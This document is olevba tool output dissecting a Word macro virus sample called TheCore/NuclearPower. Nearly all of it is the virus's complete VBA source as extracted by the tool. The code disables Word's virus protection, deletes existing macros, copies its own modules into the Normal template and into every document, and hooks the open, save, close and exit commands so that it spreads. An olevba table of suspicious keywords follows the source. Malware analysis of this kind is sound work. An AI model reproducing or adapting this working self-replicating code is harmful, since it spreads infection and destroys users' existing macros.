olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheCore-e79f88596e4bb05598257ceabd91a7930b8c22aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheCore-e79f88596e4bb05598257ceabd91a7930b8c22aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NuclearPower.frm 
in file: Virus.MSWord.TheCore-e79f88596e4bb05598257ceabd91a7930b8c22aa - OLE stream: 'Macros/VBA/NuclearPower'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 











































































































Private Sub CommandButton1_Click()
Unload Me
End Sub

Private Sub Image1_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO The_Core.bas 
in file: Virus.MSWord.TheCore-e79f88596e4bb05598257ceabd91a7930b8c22aa - OLE stream: 'Macros/VBA/The_Core'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'**************************************************
' Author  :  Putranto ILHAM Yazid
' Version :  1.20, September 1998.
' This macro is inspired by DwiGanteng macro virus.
' Special thank's and credit are expressed to him.
'**************************************************

Sub AutoExec()
    Options.VirusProtection = False
    Application.DefaultSaveFormat = ""
    WordBasic.DisableAutoMacros 1
End Sub

Sub AutoOpen()
    Call Infect_Normal_Template
End Sub

Sub Infect_Normal_Template()
    Options.VirusProtection = False
    Application.DefaultSaveFormat = ""
    Set NT = NormalTemplate
    MacroCount = NT.VBProject.VBComponents.Count
    For i = 1 To MacroCount
      NMacr = NT.VBProject.VBComponents(i).Name
      If Left(NMacr, 7) = "Version" Then
        If Val(Right(NMacr, 3)) >= 130 Then Exit Sub
      End If
    Next i
    i = MacroCount
' deletes all modules in Normal Template
    While i > 0
      NMacr = NT.VBProject.VBComponents(i).Name
      If (NMacr <> "ThisDocument") And (NMacr <> "MyUtility") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
      i = i - 1
    Wend
' then infects it with NuclearPower macro virus
    Set AD = ActiveDocument
    Application.OrganizerCopy Source:=AD.FullName, _
        Destination:=NT.FullName, Name:="NuclearPower", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=AD.FullName, _
        Destination:=NT.FullName, Name:="The_Core", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=AD.FullName, _
        Destination:=NT.FullName, Name:="Version130", _
        Object:=wdOrganizerObjectProjectItems
    Application.RecentFiles.Maximum = 9
' immediately saves Normal Template
    On Error GoTo jump1
    Templates(NT.FullName).Save
    GoTo jump2
jump1:
' alternative way of saving Normal Template
    Err.Number = 0
    WordBasic.FileOpen Name:=NT.FullName, AddToMru:=0
    WordBasic.FileClose 1
jump2:
' clear existing MRU list; since we can't intercept open calls there
Dim num$
Dim DlgTOG As Object
    Set DlgTOG = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral DlgTOG
    num$ = WordBasic.[LTrim$](DlgTOG.RecentFileCount)
    DlgTOG.RecentFileCount = 0
    WordBasic.ToolsOptionsGeneral DlgTOG
    DlgTOG.RecentFileCount = WordBasic.Val(num$)
    WordBasic.ToolsOptionsGeneral DlgTOG
End Sub

Sub Infect_Document()
    On Error GoTo endsub ' traps error while exit with no document opened
    Set AD = ActiveDocument
    MacroCount = AD.VBProject.VBComponents.Count
    For i = 1 To MacroCount
      NMacr = AD.VBProject.VBComponents(i).Name
      If Left(NMacr, 7) = "Version" Then
        If Val(Right(NMacr, 3)) >= 130 Then Exit Sub
      End If
    Next i
    i = MacroCount
' deletes all modules in the document
    While i > 0
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr <> "ThisDocument" Then
        Application.OrganizerDelete Source:=AD.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
      i = i - 1
    Wend
' then infects it with NuclearPower macro virus
    Set NT = NormalTemplate
    Application.OrganizerCopy Source:=NT.FullName, _
        Destination:=AD.FullName, Name:="NuclearPower", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NT.FullName, _
        Destination:=AD.FullName, Name:="The_Core", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NT.FullName, _
        Destination:=AD.FullName, Name:="Version130", _
        Object:=wdOrganizerObjectProjectItems
' immediately saves the document as Word97 file format
    AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
endsub:
End Sub

Sub FileClose()
    Call Infect_Normal_Template
    If InStr(ActiveDocument.FullName, "\") = 0 Then
        If ActiveDocument.Characters.Count > 1 Then
            yes = MsgBox(prompt:="Do you want to save the changes you made to " + _
            ActiveDocument.FullName + "?", Buttons:=vbYesNoCancel + vbExclamation)
            If yes = vbYes Then
                If Dialogs(wdDialogFileSaveAs).Show <> 0 Then
                    Call Infect_Document
                  Else
                    Exit Sub
                End If
              ElseIf yes = vbNo Then
                ActiveDocument.Saved = True
              Else
                Exit Sub
            End If
        End If
      Else
        Call Infect_Document
    End If
    On Error Resume Next ' traps error while canceling file close
    WordBasic.FileClose
End Sub

Sub FileOpen()
    Call Infect_Normal_Template
    If Dialogs(wdDialogFileOpen).Show <> 0 Then Call Infect_Document
End Sub

Sub FileSave()
    Call Infect_Normal_Template
    If InStr(ActiveDocument.FullName, "\") = 0 Then
        If Dialogs(wdDialogFileSaveAs).Show <> 0 Then Call Infect_Document
      Else
        Call Infect_Document
    End If
End Sub

Sub FileSaveAs()
    Call Infect_Normal_Template
    If Dialogs(wdDialogFileSaveAs).Show <> 0 Then Call Infect_Document
End Sub

Sub FileExit()
    Call Infect_Normal_Template
    On Error GoTo jump ' traps error while exit with no document opened
    If InStr(ActiveDocument.FullName, "\") = 0 Then
        If ActiveDocument.Characters.Count > 1 Then
            yes = MsgBox(prompt:="Do you want to save the changes you made to " + _
            ActiveDocument.FullName + "?", Buttons:=vbYesNoCancel + vbExclamation)
            If yes = vbYes Then
                If Dialogs(wdDialogFileSaveAs).Show <> 0 Then
                    Call Infect_Document
                  Else
                    Exit Sub
                End If
              ElseIf yes = vbNo Then
                ActiveDocument.Saved = True
              Else
                Exit Sub
            End If
        End If
      Else
        Call Infect_Document
    End If
jump:
    If (WeekDay(Date) = vbMonday) Or (WeekDay(Date) = vbThursday) Then
        Beep
Rem        NuclearPower.Show
    End If
    WordBasic.FileExit
End Sub

Sub FileNew()
    Call Infect_Normal_Template
    Dialogs(wdDialogFileNew).Show
End Sub

Sub HelpAbout()
    Beep
    NuclearPower.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Version130.bas 
in file: Virus.MSWord.TheCore-e79f88596e4bb05598257ceabd91a7930b8c22aa - OLE stream: 'Macros/VBA/Version130'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
' just a dummy module that indicates the version of NuclearPower97
' version 1.20
'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

